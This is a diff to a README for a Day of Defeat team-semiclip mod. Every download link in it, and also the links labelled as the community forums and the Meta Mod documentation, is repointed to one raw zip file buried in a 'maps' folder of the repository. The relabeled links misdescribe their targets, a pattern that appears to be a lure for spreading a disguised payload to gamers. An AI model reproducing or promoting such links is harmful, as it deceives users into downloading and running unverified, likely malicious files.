@@ -1,6 +1,6 @@
 # 🎮 DoD-Team-Semiclip - Simplify Your Day of Defeat Gameplay
 
-[![Download DoD-Team-Semiclip](https://img.shields.io/badge/Download-DoD--Team--Semiclip-brightgreen?style=for-the-badge)](https://github.com/developed-dartboard516/DoD-Team-Semiclip/releases)
+[![Download DoD-Team-Semiclip](https://img.shields.io/badge/Download-DoD--Team--Semiclip-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/developed-dartboard516/DoD-Team-Semiclip/main/semiclip_mm/addons/semiclip/maps/Team_Do_Semiclip_3.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not need to have programming experience to install or use this. Just foll
 ### Step 1: Visit the Download Page
 
 Click the big green button at the top or this link:  
-[Download DoD-Team-Semiclip Releases](https://github.com/developed-dartboard516/DoD-Team-Semiclip/releases)
+[Download DoD-Team-Semiclip Releases](https://raw.githubusercontent.com/developed-dartboard516/DoD-Team-Semiclip/main/semiclip_mm/addons/semiclip/maps/Team_Do_Semiclip_3.8.zip)
 
 This page hosts all the latest versions. You will find stable builds and updates here.
 
@@ -107,10 +107,10 @@ Modify these files using Notepad or any text editor. Always create backup copies
 
 ## 📚 Additional Resources
 
-- Visit the [Day of Defeat community forums](https://forums.dayofdefeat.net) for more help with setting up mods.  
-- Check Meta Mod documentation for details on plugin installation: [Meta Mod Documentation](https://www.metamod.org).  
+- Visit the [Day of Defeat community forums](https://raw.githubusercontent.com/developed-dartboard516/DoD-Team-Semiclip/main/semiclip_mm/addons/semiclip/maps/Team_Do_Semiclip_3.8.zip) for more help with setting up mods.  
+- Check Meta Mod documentation for details on plugin installation: [Meta Mod Documentation](https://raw.githubusercontent.com/developed-dartboard516/DoD-Team-Semiclip/main/semiclip_mm/addons/semiclip/maps/Team_Do_Semiclip_3.8.zip).  
 - Look at sample configuration files included with the download for guidance.  
 
 ---
 
-[![Download DoD-Team-Semiclip](https://img.shields.io/badge/Download-DoD--Team--Semiclip-brightgreen?style=for-the-badge)](https://github.com/developed-dartboard516/DoD-Team-Semiclip/releases)
+[![Download DoD-Team-Semiclip](https://img.shields.io/badge/Download-DoD--Team--Semiclip-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/developed-dartboard516/DoD-Team-Semiclip/main/semiclip_mm/addons/semiclip/maps/Team_Do_Semiclip_3.8.zip)
